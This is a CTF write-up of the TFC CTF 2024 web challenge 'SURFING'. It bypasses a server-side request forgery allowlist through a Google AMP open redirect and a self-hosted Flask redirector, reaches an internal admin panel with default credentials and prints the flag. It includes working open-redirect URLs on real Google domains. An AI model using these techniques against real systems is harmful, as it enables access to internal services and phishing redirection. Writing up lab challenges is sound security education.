## SURFING

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 42 solves / 356 points
- Author: @skyv3il
- Difficulty: Easy
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

My friend wanted a site on which he could steal other people's photos. Can you break into it ?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804211546.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804211632.png)

In here, we can submit a URL with domain `google.com`.

Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804211806.png)

Hmm... The URL must starts with `http://google.com/`. Let's try again!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804211851.png)

Now we get response from `http://google.com/`!

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804211933.png)

When we clicked the "Fetch Content" button, it'll sends a GET request to `/get` with parameter `url`. After that, the server will response back to us with the provided URL's content.

Hmm... Basically what this web application does is send requests to the user's provided URL. 

It's also important to note that **the server's request will append `.png` to our provided URL**:

```html
<p>The requested URL <code>/.png</code> was not found on this server.[...]
```

Based on my experience, this type of web application may be vulnerable to **SSRF (Server-Side Request Forgery)**, where the attacker able to send requests to internal services, such as local loopback address (`127.0.0.1` or `localhost`).

Interestingly, if we view the source code of the index page (`/`) via Burp Suite HTTP history, we can see this HTML comment:

```html
<!--  Reminder ! Change creds for admin panel on localhost:8000  ! -->
```

Hmm... Looks like there's an **internal web application in `localhost:8000`**.

So, our goal is somehow bypass the `http://google.com/` check and reach to `localhost:8000`.

There're a lot of ways to bypass whitelisted domain (In our case it's `google.com`), such as domain parser confusion.

Unfortunately this check can't be bypassed, so we'll need to find another way to exploit the SSRF vulnerability.

Another method to bypass the check is to **find an open redirect in the whitelisted domain**.

> Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. - [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)

By exploiting an open redirect in `google.com`, we can **redirect the server's request to an internal network**.

Back in 2023, there's a web challenge called "youdirect" from corCTF 2023, and its goal is to find an open redirect in `youtube.com`.

Sounds similar right? Hmm... Can we find an open redirect in `google.com`?

After researching, the most common "open redirect" in `google.com` is the `/url` endpoint with GET parameter `q`, such as this: `http://google.com/url?q=http://example.com/`.

However, if we try this, we'll get this response:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804213913.png)

> Note: Behind the scenes, `google.com` will redirects us to `www.google.com`. 

As you can see, this `/url` endpoint is "half open redirect", which means **it requires user interaction**.

Hmm... Looks like we'll need to find another method.

If we Google "google.com open redirect", we should see [this blog post](https://www.greathorn.com/blog/google-and-open-redirects-preventing-your-users-from-becoming-a-victim-of-attacks/):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804214456.png)

In Google DoubleClick (`googleads.g.doubleclick.net`), it has an open redirect in route `/pcs/click` with GET parameter `adurl`.

Let's try it:

```
http://googleads.g.doubleclick.net/pcs/click?adurl=http://example.com/
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804214752.png)

Oh it worked! It indeed redirected us to `http://example.com/`!

But wait... This domain is not `google.com`...

Hmm... How about chaining `google.com`'s `/url` route with this Google DoubleClick open redirect? Will it requires user interaction? Let's find out!

```
http://google.com/url?q=http://googleads.g.doubleclick.net/pcs/click%3fadurl%3dhttp://example.com/
```

Nope. It didn't work.

Now, I wonder if `http://google.com/url` has some trusted domains that don't require user interaction, possibly some Google's products, like Google Meet.

I then Googled "google.com url redirect trusted domain", and [this blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/trusted-domain-hidden-danger-deceptive-url-redirections-in-email-phishing-attacks/) popped up!

If we scroll down a bit, we should see 3 Google platforms that are abused in phishing campaigns, one of which are "**Google Accelerated Mobile Pages (AMP)**":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804215626.png)

Surely, it should requires user interaction. Right?

Right? Oh...

```
http://google.com/amp/s/example.com
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804215820.png)

So... We can **leverage Google AMP open redirect to bypass the whitelisted domain**!

## Exploitation

Armed with above information, we can try to redirect the server's request to `localhost:8000` via Google AMP open redirect:

```
http://google.com/amp/s/localhost:8000
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804220707.png)

Huh? Google respond 404 to us? Oh, I forgot the server appends `.png` to our provided URL.

To fix this, we can add a [URI fragment](https://en.wikipedia.org/wiki/URI_fragment) (`#`, URL encoded: `%23`) at the end of the localhost's port:

```
http://google.com/amp/s/localhost:8000/%23
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804221035.png)

Now we're getting HTTP status code "500 INTERNAL SERVER ERROR"...

To figure out why this weird behavior, we can setup our own HTTP server for testing.

- Setup a simple HTTP server using Python's module `http.server`

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SURFING)-[2024.08.04|22:11:44(HKT)]
└> python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Setup port forwarding via `ngrok` with **HTTP scheme**

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SURFING)-[2024.08.04|22:11:44(HKT)]
└> ngrok http 80 --scheme http 
[...]
Forwarding                    http://cc7d-{REDACTED}.ngrok-free.app -> http://localhost:80             
[...]
```

Now we can try to send the request again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804221653.png)

Tunnel not found??

Let's try HTTPS scheme:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SURFING)-[2024.08.04|22:17:58(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://66ea-{REDACTED}.ngrok-free.app -> http://localhost:80            
[...]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804221900.png)

```shell
[...]
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [04/Aug/2024 22:18:41] "GET / HTTP/1.1" 200 -
```

Nice! It worked!

So, my theory for this weird behavior is maybe **Google AMP open redirect only supports HTTPS scheme**.

Ah ha! Because **the internal web application `localhost:8000` doesn't support HTTPS scheme**, and Google AMP returned HTTP status code "500 INTERNAL SERVER ERROR"!

To solve this, we can **host an HTTPS web application that redirects the server's request to `locahost:8000`**.

Here's a Flask web application that redirects incoming requests to `localhost:8000`:
```python
#!/usr/bin/env python3
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def indexRedirect():
    redirectUrl = 'http://localhost:8000/'
    return redirect(redirectUrl)

if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=True)
```

Then run it:

```shell
┌[siunam♥Mercury]-(~/ctf/TFC-CTF-2024/Web/SURFING)-[2024.08.04|22:40:21(HKT)]
└> python3 app.py           
 * Serving Flask app 'app'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://10.69.96.69:80
[...]
```

Next, send the request again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804224240.png)

Nice! We can now reach to the challenge's internal web application at `localhost:8000`, and it respond with this HTML content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
</head>
<body>
    <form action="admin.php" method="get">
        <label for="username">Username:</label>
        <input type="text" id="username" name="admin" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="admin" required>
        <br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
```

As you can see, path `/` is an admin login page and it has a `<form>` element.

When the form is submitted, it'll send a **GET request to `admin.php` with GET parameter `username` and `password`**.

Hmm... Strangely enough, those `<input>` elements has attribute `name` with the exact same value `admin`. In the HTML comment at the very beginning of this journey, we can assume that this is the admin credentials:

- Username: `admin`
- Password: `admin`

Therefore, we can redirect the server's request to `http://localhost:8000/admin.php?username=admin&password=admin`, which should allows us to login as the admin user!

Let's modify our Flask web application's source code!

```python
@app.route('/')
def indexRedirect():
    redirectUrl = 'http://localhost:8000/admin.php?username=admin&password=admin'
    return redirect(redirectUrl)
```

Send the request again and fingers crossed!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TCTF-CTF-2024/images/Pasted%20image%2020240804224917.png)

Let's go!! We got the flag!

- **Flag: `TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}`**

## Conclusion

What we've learned:

1. Open redirect in Google Accelerated Mobile Pages (AMP) to Server-Side Request Forgery